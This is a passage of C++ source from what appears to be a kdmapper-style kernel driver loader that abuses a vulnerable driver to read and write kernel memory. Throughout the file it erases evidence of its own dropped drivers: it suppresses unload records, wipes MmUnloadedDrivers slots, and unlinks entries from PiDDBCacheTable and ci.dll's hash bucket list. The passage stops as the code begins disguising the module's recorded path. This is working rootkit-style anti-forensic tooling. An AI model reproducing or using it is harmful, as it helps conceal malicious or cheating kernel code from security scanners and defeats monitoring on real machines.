#include "trace.h"

#include <cstring>
#include <vector>

#include "log.h"
#include "nal.h"
#include "nt.h"

namespace
{
    /* UNLOADED_DRIVERS on x64: UNICODE_STRING Name (0x00, 16 bytes),
     * StartAddress (0x10), EndAddress (0x18), CurrentTime (0x20). */
    constexpr uint32_t kUnloadedCount = 50;
    constexpr uint64_t kUnloadedEntrySize = 0x28;
    constexpr uint64_t kUnloadedNameLength = 0x00;
    constexpr uint64_t kUnloadedNameBuffer = 0x08;

    /* _RTL_BALANCED_LINKS inside _PIDDB_CACHE_ENTRY sits 0x10 past the entry, so
     * the entry address is node - 0x10. Verified by name, never assumed. */
    constexpr uint64_t kTableRootRightChild = 0x10;
    constexpr uint64_t kEntryFromNode = 0x10;

    constexpr uint32_t kMaxNodes = 256;
    constexpr uint32_t kMaxDepth = 64;

    /* _HASH_BUCKET_ENTRY on x64: List (0x00, 16 bytes), DriverName UNICODE_STRING
     * (0x10), CertHash[5] (0x20). g_KernelHashBucketList is the list head, so the
     * first eight bytes at it are the Flink of a sentinel node. */
    constexpr uint64_t kHashEntryFlink = 0x00;
    constexpr uint64_t kHashEntryName = 0x10;
    constexpr uint64_t kHashEntrySize = 0x38;

    /* KLDR_DATA_TABLE_ENTRY on x64: InLoadOrderLinks (0x00), DllBase (0x30),
     * FullDllName (0x48), BaseDllName (0x58). Only the load-order list is walked -
     * the other two link fields point at the same entries but are not maintained for
     * a driver object. */
    constexpr uint64_t kLdrNext = 0x00;
    constexpr uint64_t kLdrDllBase = 0x30;
    constexpr uint64_t kLdrFullDllName = 0x48;
    constexpr uint64_t kLdrBaseName = 0x58;

    /*
     * g_KernelHashBucketList and g_HashCacheLock are not exported. This is the
     * ci.dll sequence that references the list; the lock is a `lea rcx,[rip+x]`
     * in the bytes just ahead of it. Neither offset is stable across builds, so
     * both are resolved from the pattern instead of being hardcoded.
     */
    constexpr uint8_t kHashPattern[] =
    {
        0x48, 0x8B, 0x1D, 0x00, 0x00, 0x00, 0x00, 0xEB, 0x00,
        0xF7, 0x43, 0x40, 0x00, 0x20, 0x00, 0x00
    };
    constexpr char kHashMask[] = "xxx????x?xxxxxxx";

    constexpr uint8_t kLockPattern[] = { 0x48, 0x8D, 0x0D };
    constexpr char kLockMask[] = "xxx";
    constexpr uint32_t kLockSearchBack = 50;

    bool KernelRange(uint64_t address, uint64_t size)
    {
        /*
         * Canonical first. Bits 63:47 must all match bit 47 or the address cannot
         * be dereferenced at all - 0xffffff79806408c4 clears a naive lower-bound
         * test but faults on access, and that was bugcheck 0x3B in the loader with
         * no SEH behind it.
         */
        const uint64_t high = address >> 47;

        if (high != 0 && high != 0x1FFFF)
            return false;

        return address >= 0xFFFF800000000000ULL &&
               address + size > address &&
               address + size <= 0xFFFFFFFFFFFFFFFFULL;
    }

    /*
     * Whether the pages at [address, address+size) are actually mapped.
     *
     * KernelRange only proves an address is canonical and in the high half; it says
     * nothing about whether anything is there. A write to a canonical-but-unmapped
     * address faults inside the host driver's own memcpy, where user-mode SEH cannot
     * reach, so the machine bugchecks 0x50 instead of the scrub warning. The scrub
     * writes, so it has to know the pages are real first.
     */
    uint64_t g_addressValid = 0;

    bool Mapped(uint64_t address, uint64_t size)
    {
        if (!KernelRange(address, size))
            return false;

        if (!g_addressValid)
        {
            const uint64_t kernelBase = nal::ResolveKernelBase();

            if (!kernelBase)
                return false;

            g_addressValid = nal::GetKernelModuleExport(kernelBase, "MmIsAddressValid");

            if (!g_addressValid)
                return false;
        }

        /* Both ends. A record is at most a few hundred bytes, so its ends are enough
         * to refuse the case that matters without walking every page. */
        uint64_t ok = 0;

        if (!nal::CallKernelFunction(&ok, g_addressValid, address) || !ok)
            return false;

        ok = 0;

        if (!nal::CallKernelFunction(&ok, g_addressValid, address + size - 1))
            return false;

        return ok != 0;
    }

    bool Aligned(uint64_t address)
    {
        return (address & 0x7) == 0;
    }

    std::wstring BaseName(const std::wstring& path)
    {
        const std::wstring::size_type pos = path.find_last_of(L"\\/");
        return pos == std::wstring::npos ? path : path.substr(pos + 1);
    }

    bool SameName(const std::wstring& left, const std::wstring& right)
    {
        return _wcsicmp(left.c_str(), right.c_str()) == 0;
    }

    /*
     * Whether a name has the shape this loader generates for a dropped host: a
     * lowercase alphanumeric stem of 10-14 characters and a .sys extension.
     *
     * This is what makes the scrub work at all. It is handed the name of the CURRENT
     * session, but every record it needs to clear was written by an EARLIER session
     * under a different random name - so matching on the exact string could almost
     * never succeed, and `trace scrub found nothing` printed on every load. Matching
     * on shape catches all of our own drops without touching anything else.
     */
    bool LooksLikeOurDrop(const std::wstring& name)
    {
        const std::wstring::size_type dot = name.rfind(L'.');

        if (dot == std::wstring::npos || dot < 10 || dot > 14)
            return false;

        if (_wcsicmp(name.c_str() + dot, L".sys") != 0)
            return false;

        for (std::wstring::size_type i = 0; i < dot; ++i)
        {
            const wchar_t c = name[i];

            if (!((c >= L'a' && c <= L'z') || (c >= L'0' && c <= L'9')))
                return false;
        }

        return true;
    }

    /* Reads a UNICODE_STRING at address and returns its base name. False when the
     * descriptor does not look like one, which is the common case while probing. */
    bool ReadUnicodeName(uint64_t address, std::wstring* out)
    {
        uint8_t descriptor[0x10] = { 0 };

        /* Mapped, not merely canonical. The descriptor read itself faults inside the
         * host's own memcpy if the address is canonical but empty, and user-mode SEH
         * cannot reach a fault taken there. */
        if (!Mapped(address, sizeof(descriptor)) ||
            !nal::ReadMemory(address, descriptor, sizeof(descriptor)))
            return false;

        const uint16_t length = *(uint16_t*)(descriptor + 0x00);
        const uint16_t maximum = *(uint16_t*)(descriptor + 0x02);
        const uint64_t buffer = *(uint64_t*)(descriptor + 0x08);

        if (!length || length > 0x200 || length > maximum || (length & 1))
            return false;

        /*
         * The buffer is the field that actually killed the machine twice. A record
         * whose Length looked plausible carried Buffer = 0xffffffff8000002c: canonical,
         * so the old KernelRange test passed it, and the 0x28-byte copy from it faulted
         * 0x50 inside the host driver. Nothing is behind it, so ask whether it is
         * mapped rather than whether it is canonical.
         */
        if (!Mapped(buffer, length))
            return false;

        wchar_t text[0x101] = { 0 };
        if (!nal::ReadMemory(buffer, text, length))
            return false;

        *out = BaseName(std::wstring(text, length / 2));
        return true;
    }
}

namespace trace
{
    /*
     * Neither target is exported by name on current builds - only their contents
     * identify them - so the export is one route and a scan is the other. Both
     * scans look only inside ntoskrnl's writable data, and both cache, so the cost
     * is paid at most once per process.
     */
    uint64_t g_unloadedArray = 0;
    bool     g_unloadedScanned = false;
    uint64_t g_piddbTable = 0;
    bool     g_piddbScanned = false;
    bool     g_piddbByPattern = false;

    constexpr uint64_t kChunk = 0x10000;
    constexpr uint32_t kMaxCandidates = 256;

    /* Largest writable section of ntoskrnl, which is where both live. */
    /* One writable section, as a start and a length. */
    typedef struct _KM_SPAN
    {
        uint64_t Start;
        uint64_t Size;
    } KM_SPAN;

    /*
     * Fills out with each writable section separately.
     *
     * Returning ONE bounding span across every writable section looked right and was
     * not: the span includes the non-writable gaps between sections, and the scans
     * read a whole 64 KB chunk at a time. A chunk that straddles a gap is a read over
     * unmapped or read-only pages, and the host's copy routine has no probe behind it,
     * so the machine bugchecks 0x50 instead of the scan skipping. Every section is
     * contiguous and mapped on its own, so per-section ranges are safe by construction.
     */
    bool KernelWritableRanges(uint64_t kernelBase, std::vector<KM_SPAN>* out)
    {
        IMAGE_DOS_HEADER dos = { 0 };
        IMAGE_NT_HEADERS64 nt = { 0 };

        if (!nal::ReadMemory(kernelBase, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        if (!nal::ReadMemory(kernelBase + dos.e_lfanew, &nt, sizeof(nt)) ||
            nt.Signature != IMAGE_NT_SIGNATURE)
            return false;

        const WORD count = nt.FileHeader.NumberOfSections;

        if (!count || count > 96)
            return false;

        /*
         * Read the section headers into their own buffer.
         *
         * IMAGE_FIRST_SECTION points FIELD_OFFSET(OptionalHeader) + SizeOfOptionalHeader
         * past the header start - 0xF0 - but sizeof(IMAGE_NT_HEADERS64) is only 0x108.
         * Everything past the first section header was therefore read off the end of
         * the local stack copy, so with six sections almost the whole table was
         * garbage. Both scans use this span and both came back empty on every run,
         * while the ci.dll path - which reads through ImageSize and a pattern instead -
         * worked. That asymmetry is the tell.
         */
        std::vector<IMAGE_SECTION_HEADER> sections(count);
        const uint64_t sectionStart = kernelBase + dos.e_lfanew +
                                      FIELD_OFFSET(IMAGE_NT_HEADERS64, OptionalHeader) +
                                      nt.FileHeader.SizeOfOptionalHeader;

        if (!Mapped(sectionStart, count * sizeof(IMAGE_SECTION_HEADER)) ||
            !nal::ReadMemory(sectionStart, sections.data(),
                             count * sizeof(IMAGE_SECTION_HEADER)))
            return false;

        /*
         * Every writable section, individually. Returning only the largest meant an
         * array or table sitting in any other writable section was never scanned at
         * all; returning one merged span made the scans read across the gaps.
         */
        out->clear();

        for (WORD i = 0; i < count; ++i)
        {
            const IMAGE_SECTION_HEADER& section = sections[i];

            if (!(section.Characteristics & IMAGE_SCN_MEM_WRITE) || !section.Misc.VirtualSize)
                continue;

            KM_SPAN span = { kernelBase + section.VirtualAddress, section.Misc.VirtualSize };

            if (!Mapped(span.Start, span.Size))
                continue;

            out->push_back(span);
        }

        return !out->empty();
    }

    bool LooksLikeImageName(uint64_t address, std::wstring* out)
    {
        std::wstring name;

        if (!ReadUnicodeName(address, &name) || name.size() < 5)
            return false;

        if (_wcsicmp(name.c_str() + name.size() - 4, L".sys") != 0)
            return false;

        *out = name;
        return true;
    }

    /*
     * The array is kUnloadedCount records of 0x28 bytes, some holding a name that
     * ends in .sys. Candidates are picked out of the buffer without any kernel
     * read, then verified properly, which keeps the scan affordable.
     */
    uint64_t FindUnloadedArray(uint64_t kernelBase)
    {
        std::vector<KM_SPAN> ranges;
        std::vector<uint8_t> chunk(kChunk);
        std::vector<uint64_t> candidates;

        if (!KernelWritableRanges(kernelBase, &ranges))
            return 0;

        for (const KM_SPAN& range : ranges)
        for (uint64_t offset = 0; offset < range.Size; offset += kChunk)
        {
            const uint64_t span = (range.Size - offset < kChunk) ? range.Size - offset : kChunk;
            const uint64_t start = range.Start + offset;

            if (!Mapped(start, span) || !nal::ReadMemory(start, chunk.data(), span))
                continue;

            candidates.clear();

            for (uint64_t i = 0; i + kUnloadedEntrySize <= span &&
                 candidates.size() < kMaxCandidates; i += 8)
            {
                const uint16_t length = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength);
                const uint16_t maximum = *(uint16_t*)(chunk.data() + i + kUnloadedNameLength + 2);
                uint64_t buffer = 0;
                uint64_t lowSpan = 0;

                memcpy(&buffer, chunk.data() + i + kUnloadedNameBuffer, sizeof(buffer));
                memcpy(&lowSpan, chunk.data() + i + 0x10, sizeof(lowSpan));

                /*
                 * Name first, and the pointer test as a secondary gate. The old
                 * `named || KernelRange(lowSpan, ...)` accepted any qword that merely
                 * looked like a kernel pointer, so the 256-candidate cap filled with
                 * junk inside the first chunk and the real array - further along the
                 * span - was never reached. Every UNLOADED_DRIVERS record carries a
                 * name, so the name is the discriminating test.
                 */
                const bool named = length > 4 && length <= 0x200 && !(length & 1) &&
                                   length <= maximum && KernelRange(buffer, length) &&
                                   KernelRange(lowSpan, 0x1000);

                if (named)
                    candidates.push_back(start + i);
            }

            for (uint64_t candidate : candidates)
            {
                int names = 0;

                for (uint32_t i = 0; i < kUnloadedCount; ++i)
                {
                    std::wstring name;

                    if (LooksLikeImageName(candidate + i * kUnloadedEntrySize, &name))
                        ++names;
                }

                /* Two named records, not one. A single name inside a 50-record stride
                 * is cheap to hit by chance once the scan covers far more memory; two
                 * in a row is not. */
                if (names >= 2)
                    return candidate;
            }
        }

        return 0;
    }

    /*
     * The table is an RTL_AVL_TABLE; its root's right child at +0x10 leads to a node
     * whose entry sits 0x10 before it. A pointer into writable data that leads to a
     * node carrying a .sys name is the table.
     */
    uint64_t FindPiddbTable(uint64_t kernelBase)
    {
        std::vector<KM_SPAN> ranges;
        std::vector<uint8_t> chunk(kChunk);

        if (!KernelWritableRanges(kernelBase, &ranges))
            return 0;

        for (const KM_SPAN& range : ranges)
        for (uint64_t offset = 0; offset < range.Size; offset += kChunk)
        {
            const uint64_t span = (range.Size - offset < kChunk) ? range.Size - offset : kChunk;
            const uint64_t start = range.Start + offset;

            if (!Mapped(start, span) || !nal::ReadMemory(start, chunk.data(), span))
                continue;

            for (uint64_t i = 0; i + sizeof(uint64_t) <= span; i += 8)
            {
                uint64_t table = 0;
                uint64_t root = 0;

                memcpy(&table, chunk.data() + i, sizeof(table));

                /* Mapped, not canonical: this is the read that bugchecked. The value
                 * comes out of a scanned buffer, so it is only as good as the scan, and
                 * the copy behind it has no probe. */
                if (!Mapped(table, 0x80))
                    continue;

                if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
                    continue;

                if (!root)
                    return table;

                if (!Mapped(root, 0x20))
                    continue;

                for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
                {
                    std::wstring name;

                    if (LooksLikeImageName(root - kEntryFromNode + probe, &name))
                        return table;
                }
            }
        }

        return 0;
    }

    /*
     * Scans a kernel image for a masked byte pattern ('?' is a wildcard). Chunked,
     * so a multi-megabyte image never needs one big read, and overlapped by the
     * pattern length so a match straddling a chunk boundary is still found.
     */
    uint64_t FindPatternInImage(uint64_t base, uint32_t size, const uint8_t* pattern,
                                const char* mask)
    {
        const size_t length = strlen(mask);
        std::vector<uint8_t> chunk(kChunk + length);

        for (uint64_t offset = 0; offset + length <= size; offset += kChunk)
        {
            const uint64_t span =
                (size - offset < kChunk + length) ? size - offset : kChunk + length;

            /* Mapped before the read: a chunk over a gap faults in the host's own
             * copy, where user-mode SEH cannot reach it. */
            if (!Mapped(base + offset, span) ||
                !nal::ReadMemory(base + offset, chunk.data(), span))
                continue;

            for (uint64_t i = 0; i + length <= span; ++i)
            {
                size_t j = 0;

                for (; j < length; ++j)
                {
                    if (mask[j] != '?' && chunk[(size_t)i + j] != pattern[j])
                        break;
                }

                if (j == length)
                    return base + offset + i;
            }
        }

        return 0;
    }

    /* The disp32 at `offset` is relative to the end of the instruction, which sits
     * `length` bytes past its start. */
    uint64_t Relative(uint64_t instruction, uint64_t offset, uint64_t length)
    {
        int32_t displacement = 0;

        if (!nal::ReadMemory(instruction + offset, &displacement, sizeof(displacement)))
            return 0;

        return instruction + length + (int64_t)displacement;
    }

    /* SizeOfImage from a live image's own headers, so a scan has a bound. */
    uint32_t ImageSize(uint64_t base)
    {
        uint8_t headers[0x40] = { 0 };

        if (!nal::ReadMemory(base, headers, sizeof(headers)))
            return 0;

        if (headers[0] != 'M' || headers[1] != 'Z')
            return 0;

        int32_t ntHeaders = 0;
        memcpy(&ntHeaders, headers + 0x3C, sizeof(ntHeaders));

        if (ntHeaders <= 0)
            return 0;

        /* lfanew + NT signature (4) + IMAGE_FILE_HEADER (0x14) + SizeOfImage
         * (0x38 into the optional header). */
        uint32_t size = 0;

        if (!nal::ReadMemory(base + (uint64_t)ntHeaders + 0x50, &size, sizeof(size)))
            return 0;

        return size;
    }

    /*
     * Clears the unload record the kernel would otherwise write for the host.
     *
     * kdmapper's route, and the reason it beats scanning: nothing here is guessed.
     * Walk our own handle table entry for the device, follow FILE_OBJECT ->
     * DeviceObject -> DriverObject -> DriverSection, and zero the LDR entry's
     * BaseDllName.Length. MiRememberUnloadedDriver skips any driver whose
     * BaseDllName length is zero, so the record is never written - there is no
     * array to locate and no candidate to false-positive on, which is exactly what
     * produced three bugchecks.
     *
     * Offset-free apart from ABI-stable structure fields, so it does not drift with
     * a kernel build.
     */
    bool CleanUnloadRecord()
    {
        if (nal::hDevice == INVALID_HANDLE_VALUE)
            return false;

        /*
         * Retried, like kdmapper does: the handle table grows between the sizing
         * call and the real one, so a single attempt with slack loses the race
         * whenever anything in the system opens a handle. Bounded so a pathological
         * table cannot spin here.
         */
        ULONG needed = 0;
        std::vector<uint8_t> buffer;
        NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;

        for (int attempt = 0; attempt < 8; ++attempt)
        {
            status = nt::NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation, nullptr, 0,
                &needed);

            if (status != STATUS_INFO_LENGTH_MISMATCH || !needed)
                return false;

            buffer.assign((size_t)needed + 0x2000, 0);

            status = nt::NtQuerySystemInformation(
                (SYSTEM_INFORMATION_CLASS)nt::SystemExtendedHandleInformation,
                buffer.data(), (ULONG)buffer.size(), &needed);

            if (NT_SUCCESS(status))
                break;
        }

        if (!NT_SUCCESS(status))
            return false;

        const auto* info = (nt::PSYSTEM_HANDLE_INFORMATION_EX)buffer.data();
        uint64_t object = 0;

        for (ULONG_PTR i = 0; i < info->HandleCount; ++i)
        {
            const nt::SYSTEM_HANDLE& handle = info->Handles[i];

            if (handle.UniqueProcessId != (HANDLE)(ULONG_PTR)GetCurrentProcessId())
                continue;

            if (handle.HandleValue == nal::hDevice)
            {
                object = (uint64_t)handle.Object;
                break;
            }
        }

        if (!object)
            return false;

        /* FILE_OBJECT -> DeviceObject -> DriverObject -> DriverSection. */
        uint64_t device = 0;
        uint64_t driver = 0;
        uint64_t section = 0;

        if (!nal::ReadMemory(object + 0x08, &device, sizeof(device)) || !device)
            return false;

        if (!nal::ReadMemory(device + 0x08, &driver, sizeof(driver)) || !driver)
            return false;

        if (!nal::ReadMemory(driver + 0x28, &section, sizeof(section)) || !section)
            return false;

        /* BaseDllName sits at 0x58 in KLDR_DATA_TABLE_ENTRY, the same offset our own
         * KM_LDR_ENTRY asserts. */
        if (!Mapped(section + 0x58, 0x10))
            return false;

        UNICODE_STRING name = { 0 };

        if (!nal::ReadMemory(section + 0x58, &name, sizeof(name)) || !name.Length)
            return false;

        std::wstring text(name.Length / sizeof(wchar_t), L'\0');

        if (name.Buffer && Mapped((uint64_t)name.Buffer, name.Length) &&
            nal::ReadMemory((uint64_t)name.Buffer, &text[0], name.Length))
            ;
        else
            text.assign(L"(unreadable)");

        /* Only the length is zeroed; that is the field MiRememberUnloadedDriver tests. */
        const USHORT zero = 0;

        if (!nal::WriteMemory(section + 0x58, (void*)&zero, sizeof(zero)))
            return false;

        km_log::Good("unload record suppressed for %ls", text.c_str());
        return true;
    }

    int ScrubUnloadedDrivers(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        /*
         * The export is a pointer variable, so it is dereferenced to reach the
         * array. It is not exported on current builds, so the scan is the route
         * that actually works there.
         */
        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "MmUnloadedDrivers");
        uint64_t array = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &array, sizeof(array));

        if (!array || !Mapped(array, kUnloadedEntrySize * 2))
        {
            if (!g_unloadedScanned)
            {
                g_unloadedArray = FindUnloadedArray(kernelBase);
                g_unloadedScanned = true;
            }

            array = g_unloadedArray;

            if (array)
                km_log::Step("MmUnloadedDrivers found by scan at 0x%llX",
                             (unsigned long long)array);
        }

        /* Canonical is not mapped: the widened scan can return a canonical address
         * with nothing behind it, and the write then bugchecks inside the host. */
        if (!array || !Mapped(array, kUnloadedEntrySize * 2))
        {
            km_log::Warn("MmUnloadedDrivers not resolved - unload trace left in place");
            return 0;
        }

        int cleared = 0;

        for (uint32_t i = 0; i < kUnloadedCount; ++i)
        {
            const uint64_t entry = array + i * kUnloadedEntrySize;
            std::wstring name;

            if (!ReadUnicodeName(entry, &name) ||
                (!SameName(name, wanted) && !LooksLikeOurDrop(name)))
                continue;

            /* Zero the whole record: name, start, end and timestamp. A partially
             * cleared entry is still findable by its timestamp. */
            uint8_t zero[kUnloadedEntrySize] = { 0 };

            if (!Mapped(entry, sizeof(zero)))
            {
                km_log::Warn("unloaded-driver slot %u is not mapped - left in place", i);
                continue;
            }

            if (!nal::WriteMemory(entry, zero, sizeof(zero)))
            {
                km_log::Warn("could not clear unloaded-driver slot %u", i);
                continue;
            }

            ++cleared;
        }

        (void)kUnloadedNameLength;
        (void)kUnloadedNameBuffer;
        return cleared;
    }

    /*
     * Locates PiDDBCacheTable by byte pattern, the way kdmapper does.
     *
     * The shape scan below has never once succeeded on this machine, whereas the
     * pattern route is exactly what kdmapper ships and maintains per kernel build -
     * it carries a second pattern specifically annotated "update for build
     * 26100.1000", which is the build here. A pattern finds the instruction that
     * references the table and resolves the RIP-relative displacement out of it, so
     * the answer is exact instead of inferred from whatever happens to sit nearby.
     *
     * Patterns still drift, so the current and pre-26100 shapes are both tried and
     * the caller keeps the scan as a fallback.
     */
    uint64_t FindPiddbByPattern(uint64_t kernelBase)
    {
        const uint32_t size = ImageSize(kernelBase);

        if (!size)
            return 0;

        /* 66 03 D2 48 8D 0D - `lea rcx,[rip+x]`, displacement six bytes in. */
        static const uint8_t current[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
        /* 48 8B F9 33 C0 48 8D 0D - the shape before 26100, same offset. */
        static const uint8_t earlier[] = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };

        uint64_t hit = FindPatternInImage(kernelBase, size, current, "xxxxxx");

        if (!hit)
            hit = FindPatternInImage(kernelBase, size, earlier, "xxxxxxxx");

        if (!hit)
            return 0;

        /* `lea rcx,[rip+disp32]` starts two bytes into the match and ends ten bytes
         * in, which is where the displacement is measured from. */
        const uint64_t table = Relative(hit + 2, 6, 10);

        if (!table || !Mapped(table, 0x80))
            return 0;

        return table;
    }

    int ScrubPiddbCache(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        const uint64_t symbol = nal::GetKernelModuleExport(kernelBase, "PiDDBCacheTable");
        uint64_t table = 0;

        if (symbol && KernelRange(symbol, sizeof(uint64_t)))
            nal::ReadMemory(symbol, &table, sizeof(table));

        if (!table || !Mapped(table, 0x80))
        {
            if (!g_piddbScanned)
            {
                g_piddbTable = FindPiddbByPattern(kernelBase);
                g_piddbByPattern = g_piddbTable != 0;

                if (g_piddbTable)
                {
                    km_log::Step("PiDDBCacheTable found by pattern at 0x%llX",
                                 (unsigned long long)g_piddbTable);
                }
                else
                {
                    g_piddbTable = FindPiddbTable(kernelBase);
                }

                g_piddbScanned = true;
            }

            table = g_piddbTable;

            /* Only say "by scan" when it really came from the scan - the pattern
             * route already logged itself, and re-running it here would cost a full
             * image scan just to choose a message. */
            if (table && !g_piddbByPattern)
                km_log::Step("PiDDBCacheTable found by scan at 0x%llX",
                             (unsigned long long)table);
        }

        if (!table || !Mapped(table, 0x80))
        {
            km_log::Warn("PiDDBCacheTable not resolved - cache entry left in place");
            return 0;
        }

        uint64_t root = 0;
        if (!nal::ReadMemory(table + kTableRootRightChild, &root, sizeof(root)))
            return 0;

        uint64_t stack[kMaxDepth] = { 0 };
        uint32_t depth = 0;
        uint32_t visited = 0;
        int unlinked = 0;

        if (root && Mapped(root, 0x20))
            stack[depth++] = root;

        while (depth && visited < kMaxNodes)
        {
            const uint64_t node = stack[--depth];
            ++visited;

            if (!Mapped(node, 0x20) || !Aligned(node))
                continue;

            const uint64_t entry = node - kEntryFromNode;

            /* The descriptor offset inside the entry has moved between builds, so
             * probe the header instead of hardcoding one. The name is validated
             * before anything is written. */
            for (uint64_t probe = 0x08; probe <= 0x58; probe += 0x08)
            {
                std::wstring name;

                if (!ReadUnicodeName(entry + probe, &name) ||
                    (!SameName(name, wanted) && !LooksLikeOurDrop(name)))
                    continue;

                uint64_t flink = 0;
                uint64_t blink = 0;

                if (!nal::ReadMemory(entry, &flink, sizeof(flink)) ||
                    !nal::ReadMemory(entry + 0x08, &blink, sizeof(blink)))
                    break;

                if (!Mapped(flink, 0x10) || !Mapped(blink, 0x10) ||
                    !Aligned(flink) || !Aligned(blink))
                    break;

                /* Only write when the neighbours still point back at this entry;
                 * otherwise the list layout is not what we think it is. */
                uint64_t check = 0;

                if (!nal::ReadMemory(flink + 0x08, &check, sizeof(check)) || check != entry ||
                    !nal::ReadMemory(blink, &check, sizeof(check)) || check != entry)
                {
                    km_log::Warn("PiDDBCache list does not point back at the entry - skipped");
                    break;
                }

                if (!Mapped(flink, 0x10) || !Mapped(blink, 0x10) ||
                    !nal::WriteMemory(flink + 0x08, &blink, sizeof(blink)) ||
                    !nal::WriteMemory(blink, &flink, sizeof(flink)))
                {
                    km_log::Warn("could not unlink the PiDDBCache entry");
                    break;
                }

                ++unlinked;
                break;
            }

            uint64_t left = 0;
            uint64_t right = 0;

            if (nal::ReadMemory(node + 0x08, &left, sizeof(left)) && left && Mapped(left, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = left;

            if (nal::ReadMemory(node + 0x10, &right, sizeof(right)) && right && Mapped(right, 0x20) &&
                depth < kMaxDepth)
                stack[depth++] = right;
        }

        return unlinked;
    }

    /*
     * ci.dll keeps a validated-image record for the life of the boot, keyed by the
     * image's own name, and it is not cleared by unloading: cleaning
     * MmUnloadedDrivers and the PiDDB cache still leaves this list holding the
     * host image's name until reboot.
     *
     * Neither the list nor its lock is exported, so both are resolved from the
     * ci.dll byte sequence that references them. The walk runs under the cache
     * lock through the kernel-call trampoline, and every write is validated
     * first - the descriptor must read as a real name and both neighbours must
     * point back at the entry - because a half-unlinked list here faults the
     * machine rather than just losing the scrub.
     */
    int ScrubHashBucketList(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);
        const uint64_t kernelBase = nal::ResolveKernelBase();

        if (wanted.empty() || !kernelBase)
            return 0;

        const uint64_t ci = nal::GetKernelModuleBase("ci.dll");

        if (!ci)
        {
            km_log::Warn("ci.dll not resolved - hash bucket entry left in place");
            return 0;
        }

        const uint32_t size = ImageSize(ci);

        if (!size)
            return 0;

        const uint64_t hit = FindPatternInImage(ci, size, kHashPattern, kHashMask);

        if (!hit)
        {
            km_log::Warn("g_KernelHashBucketList not found - hash bucket entry left in place");
            return 0;
        }

        const uint64_t list = Relative(hit, 3, 7);

        /* The lock reference is a few bytes ahead of the list reference. */
        const uint64_t lockHit =
            FindPatternInImage(hit - kLockSearchBack, kLockSearchBack, kLockPattern, kLockMask);

        if (!list || !lockHit)
        {
            km_log::Warn("g_HashCacheLock not found - hash bucket entry left in place");
            return 0;
        }

        const uint64_t lock = Relative(lockHit, 3, 7);

        if (!Mapped(list, 0x10) || !Mapped(lock, 0x10))
            return 0;

        const uint64_t acquire =
            nal::GetKernelModuleExport(kernelBase, "ExAcquireResourceExclusiveLite");
        const uint64_t release =
            nal::GetKernelModuleExport(kernelBase, "ExReleaseResourceLite");

        if (!acquire || !release)
        {
            km_log::Warn("cache lock helpers unresolved - hash bucket entry left in place");
            return 0;
        }

        uint64_t locked = 0;

        if (!nal::CallKernelFunction(&locked, acquire, lock, (uint64_t)1) || !locked)
        {
            km_log::Warn("g_HashCacheLock could not be taken - hash bucket entry left in place");
            return 0;
        }

        int unlinked = 0;
        uint64_t entry = 0;

        if (!nal::ReadMemory(list, &entry, sizeof(entry)))
            entry = 0;

        for (uint32_t guard = 0; entry && Mapped(entry, kHashEntrySize) && guard < kMaxNodes;
             ++guard)
        {
            uint64_t next = 0;

            if (!nal::ReadMemory(entry + kHashEntryFlink, &next, sizeof(next)))
                break;

            std::wstring name;

            if (ReadUnicodeName(entry + kHashEntryName, &name) &&
                (SameName(name, wanted) || LooksLikeOurDrop(name)))
            {
                uint64_t flink = 0;
                uint64_t blink = 0;

                if (nal::ReadMemory(entry, &flink, sizeof(flink)) &&
                    nal::ReadMemory(entry + 0x08, &blink, sizeof(blink)) &&
                    Mapped(flink, 0x10) && Mapped(blink, 0x10) &&
                    Aligned(flink) && Aligned(blink))
                {
                    uint64_t check = 0;

                    if (nal::ReadMemory(flink + 0x08, &check, sizeof(check)) && check == entry &&
                        nal::ReadMemory(blink, &check, sizeof(check)) && check == entry &&
                        nal::WriteMemory(flink + 0x08, &blink, sizeof(blink)) &&
                        nal::WriteMemory(blink, &flink, sizeof(flink)))
                    {
                        ++unlinked;

                        /* The entry's own forward link is the next node. */
                        next = flink;
                    }
                }
            }

            entry = next;
        }

        uint64_t released = 0;

        if (!nal::CallKernelFunction(&released, release, lock))
            km_log::Warn("g_HashCacheLock could not be released");

        return unlinked;
    }

    void Scrub(const std::wstring& imageName)
    {
        /*
         * Preferred route: stop the record being written at all. The array scrub is
         * the fallback, kept because the handle walk needs an open device and a
         * readable object chain.
         */
        int unloaded = CleanUnloadRecord() ? 1 : 0;

        if (!unloaded)
            unloaded = ScrubUnloadedDrivers(imageName);

        const int cached = ScrubPiddbCache(imageName);
        const int hashed = ScrubHashBucketList(imageName);

        if (unloaded || cached || hashed)
            km_log::Good("trace scrub: %d unload slot(s), %d cache entry(ies), %d hash entry(ies) "
                         "cleared for %ls",
                          unloaded, cached, hashed, BaseName(imageName).c_str());
        else
            km_log::Warn("trace scrub found nothing for %ls (a resident image is not in the unload list)",
                         BaseName(imageName).c_str());
    }

    /*
     * Rewrites the host's own module-list entry so the path ntoskrnl recorded for a
     * loaded driver stops pointing at %TEMP%.
     *
     * This is what a scanner actually reads. For a loaded driver the path comes out
     * of its KLDR_DATA_TABLE_ENTRY, not off the disk, so deleting the file leaves the
     * recorded name untouched and the driver stays named by where it was loaded from.
     *
     * The base name is kept deliberately: the unload scrub matches on it, and the
     * MmUnloadedDrivers record written at unload takes the same name. Only the
     * directory is disguised, into where an in-box driver of that name would sit.
     */
    bool DisguiseLoadedModule(const std::wstring& imageName)
    {
        const std::wstring wanted = BaseName(imageName);

        if (wanted.empty())
        {
            km_log::Warn("disguise: no image name given");
            return false;
        }

